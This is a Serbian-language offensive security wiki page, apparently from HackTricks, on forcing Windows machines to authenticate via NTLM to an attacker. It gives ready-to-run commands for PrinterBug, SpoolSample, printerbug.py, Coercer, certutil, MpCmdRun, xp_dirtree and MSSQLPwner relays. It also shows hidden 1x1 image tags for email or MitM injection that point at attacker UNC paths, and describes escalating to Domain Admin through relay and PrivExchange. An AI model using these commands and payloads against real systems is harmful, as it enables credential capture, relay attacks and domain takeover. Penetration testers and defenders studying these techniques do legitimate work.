# Prinudna privilegovana NTLM autentikacija

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) je **kolekcija** **okidača za udaljenu autentikaciju**, napisana u jeziku C# pomoću MIDL compiler-a radi izbegavanja dependencies trećih strana.

## Spooler Service Abuse

Ako je servis _**Print Spooler**_ **omogućen,** možete upotrebiti neke već poznate AD credentials da **zatražite** od print servera Domain Controller-a **ažuriranje** o novim poslovima štampanja i jednostavno mu kažete da **pošalje obaveštenje nekom sistemu**.\
Imajte na umu da, kada printer pošalje obaveštenje proizvoljnim sistemima, mora da se **autentifikuje na** tom **sistemu**. Zbog toga napadač može naterati servis _**Print Spooler**_ da se autentifikuje na proizvoljnom sistemu, a servis će u ovoj autentikaciji **koristiti nalog računara**.

U pozadini, klasični **PrinterBug** primitive zloupotrebljava **`RpcRemoteFindFirstPrinterChangeNotificationEx`** preko **`\\PIPE\\spoolss`**. Napadač najpre otvara handle printera/servera, a zatim prosleđuje lažno ime klijenta u `pszLocalMachine`, zbog čega ciljni spooler kreira kanal za obaveštenja **nazad ka hostu pod kontrolom napadača**. Zbog toga je posledica **prinudna outbound autentikacija**, a ne direktno izvršavanje koda.<sup>[[2]](#references)</sup>\
Ako tražite **RCE/LPE** u samom spooler-u, pogledajte [PrintNightmare](printnightmare.md). Ova stranica je fokusirana na **coercion i relay**.

### Pronalaženje Windows servera na domenu

Koristite PowerShell da izlistate Windows hostove. Serveri su obično ciljevi najvišeg prioriteta, zato se prvo fokusirajte na njih:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Pronalaženje Spooler servisa koji osluškuju

Koristeći malo izmenjeni [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autora @mysmartlogin (Vincent Le Toux), proverite da li Spooler Service osluškuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Takođe možete koristiti `rpcdump.py` na Linuxu i potražiti protokol **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Ili brzo testirajte hostove sa Linux-a pomoću **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Ako želite da **enumerate coercion surfaces** umesto da samo proverite da li spooler endpoint postoji, koristite **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Ovo je korisno zato što prikazivanje endpoint-a u EPM-u samo potvrđuje da je print RPC interface registrovan. To **ne** garantuje da je svaki coercion metod dostupan sa vašim trenutnim privilegijama niti da će host pokrenuti upotrebljiv authentication flow.

### Zatražite od servisa da se autentifikuje na proizvoljnom hostu

Možete kompajlirati [SpoolSample odavde](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
ili koristite [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ili [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ako ste na Linux-u
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Pomoću alata **Coercer** možete direktno ciljati interfejse spooler-a i izbeći nagađanje o tome koji je RPC metod izložen:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forsiranje HTTP umesto SMB sa WebClient

Classic PrinterBug obično izaziva **SMB** authentication ka `\\attacker\share`, što je i dalje korisno za **capture**, **relay to HTTP targets** ili **relay where SMB signing is absent**.\
Međutim, u modernim okruženjima, relaying **SMB to SMB** je često blokiran zbog **SMB signing**, pa operatori često preferiraju da forsiraju **HTTP/WebDAV** authentication.

Ako je na targetu pokrenut servis **WebClient**, listener se može navesti u formi koja primorava Windows da koristi **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Ovo je naročito korisno kada se kombinuje sa **`ntlmrelayx --adcs`** ili drugim HTTP relay targets, jer se time izbegava oslanjanje na SMB relayability na coerced connection. Važna napomena je da **WebClient mora biti pokrenut** na žrtvi da bi HTTP/WebDAV varijanta radila.

### Combining with Unconstrained Delegation

Ako je napadač kompromitovao računar konfigurisan za [Unconstrained Delegation](unconstrained-delegation.md), može **naterati printer da se autentifikuje na tom računaru**. **TGT** naloga računara printera se zatim kešira u memoriji na hostu sa unconstrained delegation, odakle napadač može da ga preuzme i ponovo upotrebi pomoću [Pass the Ticket](pass-the-ticket.md).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asinhroni print interfejs na istom spooler pipe-u; koristite Coercer za enumeraciju dostupnih metoda na datom hostu<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (takođe preko \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Napomena: Ove metode prihvataju parametre koji mogu sadržati UNC path (npr. `\\attacker\share`). Kada se obrade, Windows će se autentifikovati (u kontekstu računara/korisnika) na taj UNC, čime se omogućava hvatanje ili relay NetNTLM-a.\
Kod spooler abuse-a, **MS-RPRN opnum 65** i dalje predstavlja najčešći i najbolje dokumentovani primitive, jer specifikacija protokola izričito navodi da server kreira notification channel nazad ka client-u navedenom u `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN preko \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target pokušava da otvori prosleđenu putanju backup log-a i autentifikuje se na UNC kojim upravlja napadač.<sup>[[1]](#references)</sup>
- Practical use: naterati Tier 0 assets (DC/RODC/Citrix/etc.) da emituju NetNTLM, a zatim izvršiti relay ka AD CS endpoints (ESC8/ESC11 scenarios) ili drugim privilegovanim servisima.<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` attack je posledica propusta pronađenog u **Exchange Server `PushSubscription` feature-u**. Ova funkcija omogućava da se Exchange server natera da, od strane bilo kog domain user-a sa mailbox-om, izvrši autentifikaciju na bilo kom hostu koji obezbedi client, preko HTTP-a.

Podrazumevano, **Exchange service radi kao SYSTEM** i ima prekomerne privilegije (konkretno, ima **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Ovaj propust može da se iskoristi za omogućavanje **relay-a informacija ka LDAP-u, a zatim i za ekstrakciju domain NTDS database**. U slučajevima kada relay ka LDAP-u nije moguć, ovaj propust se i dalje može koristiti za relay i autentifikaciju na druge hostove unutar domena. Uspešna eksploatacija ovog attack-a pruža neposredan pristup nalogu Domain Admin sa bilo kojim autentifikovanim domain user account-om.

## Inside Windows

Ako se već nalazite unutar Windows mašine, možete naterati Windows da se poveže sa serverom koristeći privilegovane naloge pomoću:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Ili koristite ovu drugu tehniku: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Moguće je koristiti certutil.exe lolbin (binarni fajl potpisan od strane Microsoft-a) za forsiranje NTLM autentifikacije:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Putem emaila

Ako znate **email adresu** korisnika koji se prijavljuje na računar koji želite da kompromitujete, jednostavno možete da mu pošaljete **email sa slikom dimenzija 1x1**, kao što je
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Kada je žrtva otvori, Windows pokušava da izvrši autentifikaciju.

### MitM

Ako možete da izvedete MitM napad i ubacite HTML u stranicu koju žrtva pregleda, pokušajte da ubacite sliku kao što je:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Drugi načini za force i phish NTLM autentifikaciju


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Crackovanje NTLMv1

Ako možete da uhvatite NTLMv1 challenges, [ovde pročitajte kako da ih crackujete](../ntlm/index.html#ntlmv1-attack).\
_Ne zaboravite da za crackovanje NTLMv1 morate da podesite Responder challenge na "1122334455667788"_

## References

- [1] [Unit 42 – Prinuda autentifikacije se stalno razvija](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protokol za udaljeni pristup EventLog-u](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
